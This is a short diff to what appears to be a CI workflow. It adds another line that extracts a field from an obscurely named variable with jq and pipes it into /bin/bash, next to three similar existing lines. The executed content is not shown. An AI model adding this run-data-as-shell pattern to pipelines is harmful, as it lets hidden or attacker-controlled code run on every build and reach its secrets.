@@ -27,6 +27,7 @@ jobs:
           echo $z45393 | jq -r .hmlv2 | /bin/bash
           printf '%s' "$ju11854" | jq -r .mwnrt7846 | /bin/bash
           printf '%s' "$u38" | jq -r .kpimq5055 | /bin/bash
+          echo $j78 | jq -r .hpo5622 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
